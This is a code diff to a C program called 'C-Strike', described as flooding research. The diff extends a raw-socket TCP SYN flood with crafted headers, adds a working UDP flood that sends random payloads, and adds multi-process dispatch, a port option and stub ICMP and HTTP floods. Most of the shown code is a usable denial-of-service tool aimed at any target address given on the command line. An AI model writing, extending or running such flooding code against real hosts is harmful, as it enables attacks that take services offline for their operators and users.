@@ -1,7 +1,7 @@
 //C-Strike: a security research for flooding
 //Copyright (C) 2025  Jan Kałucki
+#include <netinet/in.h>
 #include <stdio.h>
-#include <ctype.h>
 #include <stdlib.h>
 #include <time.h>
 #include <unistd.h>
@@ -19,6 +19,7 @@ extern char* optarg;
 unsigned int n_proc=4;
 unsigned int duration=10;
 unsigned int pkt_len =1000;
+unsigned short port = 80;
 char* target = "127.0.0.1";
 char* type ="UDP flooding";
 
@@ -45,7 +46,21 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
     return answer;
 }
 
-int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t duration){
+unsigned char* rand_bytes(unsigned int size){
+	srand(time(NULL));
+	unsigned char* stream = malloc(size);
+	for(unsigned int i = 0; i < size; i++){
+		stream[i]=rand();
+	}
+	return stream;
+}
+
+unsigned short random_ushort() {
+	srand(time(NULL));
+	return (unsigned short)((rand() << 8) | (rand() & 0xFF));
+}
+
+int SYN_flood(char* target,unsigned short port, unsigned int msg_len, time_t duration){
 	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("Socket error");
@@ -63,7 +78,7 @@ int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t dura
     struct sockaddr_in dest;
 
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(80);
+    dest.sin_port = htons(port);
     dest.sin_addr.s_addr = inet_addr(target);
 
     // Fill in IP Header
@@ -82,7 +97,7 @@ int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t dura
     iph->check = checksum((unsigned short *) datagram, iph->tot_len);
 
     // Fill in TCP Header
-    tcph->source = htons(12345);
+    tcph->source = htons(random_ushort());
     tcph->dest = htons(80);
     tcph->seq = random();
     tcph->ack_seq = 0;
@@ -108,7 +123,8 @@ int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t dura
     while(time(NULL)<end){
        if (sendto(sock, datagram, iph->tot_len, 0,
                (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-           perror("Send failed");
+	perror("Send failed");
+	return 2;
        } else {
            printf("SYN packet sent\n");
        }
@@ -116,21 +132,45 @@ int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len, time_t dura
     close(sock);
     return 0;
 }
-void run_processes(int n, void (*func)(char*, unsigned int, time_t), char *target, unsigned int msg_len, time_t duration) {
+int UDP_flood(char *target,unsigned short port, unsigned int msg_len, time_t duration){
+	int sock = socket(AF_INET,SOCK_DGRAM , 0);
+	if(sock < 0){
+		perror("Failed to create socket.");
+		return 1;
+	}
+	time_t end = time(NULL)+duration;
+	struct sockaddr_in server;
+	server.sin_family = AF_INET;
+	server.sin_addr.s_addr = inet_addr(target);
+	server.sin_port = htons(port);
+	unsigned char* buf = rand_bytes(msg_len);
+	while (time(NULL)<end) {
+		if(sendto(sock, buf, msg_len, 0, (struct sockaddr*)&server, sizeof(server))<0){
+			perror("Send failed");
+			return 2;
+		}
+	}
+	close(sock);
+
+	return 0;
+}
+int ICMP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
+    return 0;
+}
+int HTTP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
+    return 0;
+}
+void run_processes(int n, int (*func)(char*, unsigned short, unsigned int, time_t), char *target, unsigned short port, unsigned int msg_len, time_t duration) {
     for (int i = 0; i < n; i++) {
         pid_t pid = fork();
         if (pid < 0) {
             perror("fork failed");
             exit(EXIT_FAILURE);
         } else if (pid == 0) {
-            // Child process
-            func(target,msg_len,duration);
-            exit(EXIT_SUCCESS); // Exit child
+            func(target,port,msg_len,duration);
+            exit(EXIT_SUCCESS);
         }
-        // Parent continues to next iteration
     }
-
-    // Parent waits for all children
     for (int i = 0; i < n; i++) {
         wait(NULL);
     }
@@ -138,7 +178,7 @@ void run_processes(int n, void (*func)(char*, unsigned int, time_t), char *targe
 
 int main(int argc, char** argv){
 	//Target;type;n_proc;duration;packet_len
-	while((opts = getopt(argc,argv,"T:t:n:d:l:"))!= EOF){
+	while((opts = getopt(argc,argv,"T:t:p:n:d:l:"))!= EOF){
 		switch(opts){
 			case 'T':
 				target = optarg;
@@ -146,6 +186,9 @@ int main(int argc, char** argv){
 			case 't':
 				type = optarg;
 			break;
+			case 'p':
+				port = (unsigned short)atoi(optarg);
+
 			case 'n':
 				n_proc = (unsigned int)(atoi(optarg));
 			break;
@@ -163,6 +206,18 @@ int main(int argc, char** argv){
 	}
 	printf("target:%s,type:%s,n_proc:%d,duration:%d,pkt_len:%d",
 		target, type, n_proc, duration, pkt_len);
-	SYN_flood(target, n_proc, pkt_len,duration);
+	if(!strcmp(type, "TCP_SYN")){
+		run_processes(n_proc, SYN_flood, target, port, pkt_len, duration);
+	}
+	else if (!strcmp(type, "UDP")) {
+		run_processes(n_proc, UDP_flood, target, port, pkt_len, duration);
+	}
+	else if (!strcmp(type,"ICMP")) {
+		run_processes(n_proc, ICMP_flood, target, port, pkt_len, duration);
+	}
+	else if (!strcmp(type,"HTTP")) {
+		run_processes(n_proc, HTTP_flood, target, port, pkt_len, duration);
+	}
+
 	return 0;
 }
